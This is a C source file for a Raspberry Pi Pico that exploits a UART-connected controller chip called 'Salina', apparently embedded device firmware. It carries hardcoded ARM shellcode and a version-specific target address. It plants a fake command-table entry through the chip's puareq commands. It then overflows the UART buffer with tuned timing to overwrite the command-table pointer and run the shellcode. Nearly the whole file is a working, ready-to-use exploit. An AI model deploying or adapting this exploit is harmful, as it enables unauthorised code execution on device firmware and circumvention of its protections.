#include "../include/salina.h"

#include "macros.h"

#include <pico.h>
#include <pico/stdlib.h>
#include <hardware/gpio.h>
#include <hardware/uart.h>
#include <hardware/timer.h>

#include <string.h>
#include <stdlib.h>

#define USEC_PER_SEC 1000000ULL
#define UART_READ_TIMEOUT (1*USEC_PER_SEC)

char salinaExploitPayload_1_8_2[] = { 0x00, 0xb5, 0x45, 0xf6, 0xe8, 0x20, 0xc0, 0xf2, 0x16, 0x00, 0x4e,
                                      0xf2, 0x90, 0x21, 0xc0, 0xf2, 0x18, 0x01, 0x08, 0x60, 0x01, 0x20,
                                      0x41, 0xf2, 0x30, 0x71, 0xc0, 0xf2, 0x19, 0x01, 0x08, 0x60, 0x47,
                                      0xf6, 0xbd, 0x11, 0xc0, 0xf2, 0x12, 0x01, 0x88, 0x47, 0x00, 0xbd };
                                
SalinaExploitConf salinaExploitConfs[] = {
  {
    "E1E 0001 0008 0002 1B03",
    0x19261c,
    salinaExploitPayload_1_8_2,
    sizeof(salinaExploitPayload_1_8_2)
  }
};

SalinaHWExploitConf hwExploitConfSalina1 = {
  3,
  200,
  790
};

SalinaHWExploitConf hwExploitConfSalina2 = {
  6,
  800,
  900
};

#pragma mark private
static void salina_write_blocking(const void *buf, size_t bufSize){
  uart_write_blocking(UART_SALINA, (const uint8_t*)buf, bufSize);
  uart_tx_wait_blocking(UART_SALINA);
}

static void salina_write_nak(){
  salina_write_blocking("\x15",1);
  sleep_ms(100);
  while (uart_is_readable(UART_SALINA)) {
    (void) uart_getc(UART_SALINA);
  }
}

uint8_t checksum(const void *buf, size_t bufSize) {
  const uint8_t *ptr = (const uint8_t*)buf;
  uint8_t csum = 0;
  for (size_t i=0; i<bufSize; i++) {
    csum += ptr[i];
  }
  return csum;
}

int read_line_timeout(char *out, size_t outSize, uint64_t timeout){
  int err = 0;
  int realOutSize = 0;
  uint64_t time = time_us_64();
  for (;realOutSize < outSize; realOutSize++){
    while (!uart_is_readable(UART_SALINA)){
      if (time_us_64() - time > timeout){
        cassure(realOutSize);
        goto error;
      }
    }
    char c = uart_get_hw(UART_SALINA)->dr;
    out[realOutSize] = c;
    if (c == '\n') break;
  }
  
error:
  if (err){
    return -err;
  }
  return realOutSize;
}

int read_line(char *out, size_t outSize){
  return read_line_timeout(out, outSize, UART_READ_TIMEOUT);
}

void salina_cmd_send(const char *cmd){
  size_t cmdLen = strlen(cmd);
  char cmdline[cmdLen + 10];
  snprintf(cmdline, sizeof(cmdline),"%s:%02X\n",cmd, checksum(cmd,cmdLen));
  salina_write_blocking(cmdline, strlen(cmdline));
}

t_SalinaRes cmd_send_recv(const char *cmd, char *out, size_t outSize){
  t_SalinaRes ret = {};
  int err = 0;
  int res = 0;
  size_t cmdLen = strlen(cmd);
  char cmdline[cmdLen + 10];
  memset(cmdline, 0 , sizeof(cmdline));

  cassure(snprintf(cmdline, sizeof(cmdline),"%s:%02X\n",cmd,checksum(cmd,cmdLen)) < sizeof(cmdline));

  // debug("raw snd='%s'",cmdline);
  salina_write_blocking(cmdline, strlen(cmdline));


  cassure(read_line(cmdline, sizeof(cmdline)) > 0); //read back echo
  cassure((res = read_line(out, outSize)) > 0);
  // debug("raw out='%s'",out);
  res = sscanf(out, "%s %08x", cmdline, &ret.res);
  cassure(res == 2);
  res = sizeof("NG E0000004");
  memmove(out, &out[res], outSize-res);
  {
    size_t outlen = strlen(out);
    for (int i = outlen-1; i >0; i--){
      if (out[i] == ':'){
        out[i] = '\0';
        ret.err = i;
        goto isOk;
      }
    }
    cassure(0);
    isOk:;
  }
  ret.isOK = (strncmp(cmdline, "OK",3) == 0);
  
error:
  if (err){
    *out = '\0';
    ret.err = -err;
  }
  // debug("res.err=0x%08x",ret.err);
  // debug("res.isOK=%d",ret.isOK);
  // debug("res.res=0x%08x",ret.res);
  sleep_ms(50);
  return ret;
}

bool puareq1(uint32_t index) {
  char cmd[0x100] = {};
  snprintf(cmd, sizeof(cmd), "puareq1 %x",index);
  t_SalinaRes res = cmd_send_recv(cmd, cmd, sizeof(cmd));
  if (res.err > 0){
    // debug("puareq1(%d) = '%s'",index, cmd);
  }
  return res.isOK;
}

bool puareq2(uint32_t index, uint8_t *bytes50) {
  char cmd[0x100] = {};
  snprintf(cmd, sizeof(cmd), "puareq2 %x ",index);
  for (size_t i = 0; i < 50; i++) {
    char buf[10] = {};
    snprintf(buf, sizeof(buf), "%02x", bytes50[i]);
    strcat(cmd, buf);
  }
  t_SalinaRes res = cmd_send_recv(cmd, cmd, sizeof(cmd));
  if (res.err > 0) {
    // debug("puareq2(%d,...) = '%s'",index,cmd);
  }
  return res.isOK;
}

bool set_payload(uint8_t *payload, size_t payloadLen) {
  salina_write_nak();

  if (!puareq1(0)) {
    return false;
  }

  const size_t chunkLen = 50;
  for (size_t i = 0; i < payloadLen/chunkLen; i++) {
    if (!puareq2(i, &payload[i * chunkLen])) {
      return false;
    }
  }
  
  return true;
}

bool craft_and_set_payload(SalinaExploitConf *exploitConf) {
  struct cmd_entry {
    uint32_t name;
    uint32_t func;
    uint32_t mask;
  } __packed;
  
  struct payload {
    struct cmd_entry entries[2];
    char cmd_name[2];
    uint8_t shellcode[0]  __aligned(4);
  } __packed;
  _Static_assert((offsetof(struct payload, shellcode) % 4) == 0, "Shellcode offset not 4 byte alligned!");

  size_t shellcodeLenAligned = __align_up(exploitConf->shellcodeLen, 50);
  struct payload *payload = NULL;
  bool result = false;
  
  payload = calloc(1, sizeof(struct payload) + shellcodeLenAligned);

  payload->entries[0].name = exploitConf->ucmd_ua_buf_addr + offsetof(struct payload, cmd_name);
  payload->entries[0].func = exploitConf->ucmd_ua_buf_addr + offsetof(struct payload, shellcode) | 1;
  payload->entries[0].mask = 0xf;
  strcpy(payload->cmd_name, "A");
  memcpy(payload->shellcode, exploitConf->shellcode, exploitConf->shellcodeLen);

  result = set_payload((uint8_t*) payload, sizeof(struct payload) + shellcodeLenAligned);
error:
  safeFree(payload);
  return result;
}

void write_oob(uint8_t *value, SalinaHWExploitConf *hwConf) {
  salina_write_nak();

  size_t len = 160 * hwConf->filler_multiplier;
  uint8_t output[len];

  #define LUT "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
  for (size_t i = 0; i < len; i++) {
    output[i] = LUT[i % (sizeof(LUT) - 1)];
  }
  
  uint8_t output2[7] = { 0xC, value[0], value[1], value[2], value[3], 0, 0x15 };
  salina_write_blocking(output, sizeof(output));
  
  busy_wait_us(hwConf->pwn_delay_us);

  salina_write_blocking(output2, sizeof(output2));

  busy_wait_ms(hwConf->post_process_ms);

  // Clear UART rx here
  while (uart_is_readable(UART_SALINA)) {
    (void) uart_getc(UART_SALINA);
  }
}

bool overwrite_cmd_table_ptr(SalinaExploitConf *exploitConf, SalinaHWExploitConf *hwConf) {
  uint8_t target[sizeof(exploitConf->ucmd_ua_buf_addr)];
  for (size_t i = 0; i < sizeof(target); i++) {
    uint8_t byte = (exploitConf->ucmd_ua_buf_addr >> (i * 8)) & 0xff;
    if (byte == '\b' || byte == '\r' || byte == '\n' || byte == '\x15') {
      return false;
    }
    target[i] = byte;
  }
  
  for (size_t i = 0; i < sizeof(target); i++) {
    size_t pos = sizeof(target) - i - 1;
    uint8_t byte = target[pos];
    if (byte >= 0x20 && byte < 0x80) {
      // we want to write an ascii char - data after it will be reached.
      uint8_t to_send[sizeof(target)];
      memcpy(to_send, target, sizeof(to_send));
      for (size_t j = 0; j < pos + 1; j++) {
        to_send[j] = 0;
      }

      write_oob(to_send, hwConf);
    }
  }
  
  write_oob(target, hwConf);
  return true;
}


#pragma mark public
int salina_init (void){
  int err = 0;

  gpio_init(PIN_SALINA_RESET);
  gpio_set_dir(PIN_SALINA_RESET, GPIO_IN);
  gpio_put(PIN_SALINA_RESET, 0);

  gpio_set_function(PIN_SALINA_UART_TX, UART_FUNCSEL_NUM(UART_SALINA, PIN_SALINA_UART_TX));
  gpio_set_function(PIN_SALINA_UART_RX, UART_FUNCSEL_NUM(UART_SALINA, PIN_SALINA_UART_RX));

  uart_init(UART_SALINA, 115200);


error:
  return err;
}

void salina_cleanup(void){
  gpio_init(PIN_SALINA_UART_TX);
  gpio_init(PIN_SALINA_UART_RX);
}

bool salina_reset(){
  gpio_set_dir(PIN_SALINA_RESET, GPIO_OUT);
  sleep_us(100);
  gpio_set_dir(PIN_SALINA_RESET, GPIO_IN);
  for (int i=0; i<3; i++){
    char buf[0x100] = {};
    read_line_timeout(buf, sizeof(buf), USEC_PER_SEC*5);
    if (strncmp(buf, "$$ [MANU] UART CMD READY", sizeof("$$ [MANU] UART CMD READY")-1) == 0) return true;
  }
  return false;
}

bool salina_is_exploited(){
  int err = 0;
  salina_write_nak();
  char rsp[0x100] = {};
  t_SalinaRes res;
  res = cmd_send_recv("getserialno", rsp, sizeof(rsp));

  // debug("res.err=0x%08x",res.err);
  // debug("res.isOK=%d",res.isOK);
  // debug("res.res=0x%08x",res.res);

  cassure(res.isOK);      //salina responds with "OK" or "NG"
  cassure(res.res == 0);  //salina error code
  cassure(res.err > 0);   // if > 0, then size of response, else error inside cmd_send_recv function
  
error:
  if (err) return false;
  // debug("rsp='%s'\n",rsp);
  return true;
}

int salina_exploit(){
  if (salina_is_exploited()){
    debug("Salina already exploited");
    return 0;
  }
  debug("Salina is not yet exploited, exploiting...");

  if (!craft_and_set_payload(&salinaExploitConfs[0])) {
    error("craft_and_set_payload failed!");
    return -1;
  }

  if (!overwrite_cmd_table_ptr(&salinaExploitConfs[0], &hwExploitConfSalina2)) {
    error("overwrite_cmd_table_ptr failed!");
    return -1;
  }
  
  sleep_ms(100);
  for (size_t i = 0; i < 10; i++){
    char rsp[0x100] = {};
    salina_write_blocking("A:41\n", sizeof("A:41\n")-1);
    sleep_ms(100);
    while (read_line(rsp, sizeof(rsp)) >= 0){
      // debug("rsp='%s'",rsp);
      if (strcmp(rsp, "A:41\n") == 0) goto error;
    }
  }  
  
error:
  return salina_is_exploited();
}

void salina_tunnel_uart_tx(){
  char cmd[0x400] = {};
  size_t len = 0;
  while (len < sizeof(cmd)){
    char c =  stdio_getchar();
    if (c == '\r') c = '\n';
    putchar(c);
    if (c == '\n'){
      size_t cmdLen = len;
      char cmdline[0x20] = {};
      snprintf(cmdline, sizeof(cmdline),":%02X\n",checksum(cmd,cmdLen));
      strcat(cmd, cmdline);
      salina_write_blocking(cmd, strlen(cmd));
      len = 0;
      memset(cmd, 0, sizeof(cmd));
    }else{
      cmd[len++] = c;
    }
  }
}

void salina_tunnel_uart_rx(){
  while (1){
    putchar(uart_getc(UART_SALINA));
  }
}